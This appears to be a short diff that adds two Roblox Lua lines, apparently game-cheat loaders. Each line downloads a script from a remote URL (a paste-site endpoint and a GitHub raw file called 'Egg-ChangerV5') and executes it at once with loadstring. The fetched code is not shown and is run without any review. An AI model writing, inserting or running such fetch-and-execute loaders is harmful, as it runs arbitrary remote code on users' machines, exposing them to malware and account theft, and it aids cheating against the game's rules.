@@ -1,0 +1,2 @@
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/wGvtRRpVIaeGqpZ5/raw", true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/noobneil1/Egg-ChangerV5/refs/heads/main/Egg-changerV5"))()
